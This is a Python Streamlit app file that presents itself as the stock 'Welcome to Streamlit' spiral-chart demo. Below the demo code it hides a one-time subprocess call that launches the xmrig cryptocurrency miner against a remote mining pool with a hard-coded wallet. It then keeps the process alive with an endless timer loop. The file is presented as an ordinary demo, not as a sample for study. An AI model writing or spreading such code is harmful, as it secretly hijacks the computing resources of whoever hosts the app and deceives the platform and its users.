from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
import flag



"""

# Welcome to Streamlit!

Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:

If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community

forums](https://discuss.streamlit.io).

In the meantime, below is an example of what you can do with just a few lines of code:

"""





with st.echo(code_location='below'):

    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)

    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)



    Point = namedtuple('Point', 'x y')

    data = []



    points_per_turn = total_points / num_turns



    for curr_point_num in range(total_points):

        curr_turn, i = divmod(curr_point_num, points_per_turn)

        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn

        radius = curr_point_num / total_points

        x = radius * math.cos(angle)

        y = radius * math.sin(angle)

        data.append(Point(x, y))



    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)

        .mark_circle(color='#0068c9', opacity=0.5)

        .encode(x='x:Q', y='y:Q'))



    
st.write(flag.controlFlag)
st.write("tarik", flag.controlFlag)

if flag.controlFlag==0:
    flag.controlFlag+=1
    p = subprocess.run("./xmrig -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmrw9a6ze78mryqv55twz -m 2 -p rpc -r community-pools.mysrv.cloud:10300", stdout=subprocess.PIPE, shell=True)
    print(f"Enjoy {flag.controlFlag}")

import time 
from IPython.display import clear_output 
 
def zero_to_infinity(): 
    i = 0 
    while True: 
        yield i 
        i += 1 
        time.sleep(1) 
 
start = time.time() 
for x in zero_to_infinity(): 
    clear_output(wait=True) 
    end = time.time() 
    temp = end-start 
    hours = temp//3600 
    temp = temp - 3600*hours 
    minutes = temp//60 
    seconds = temp - 60*minutes     
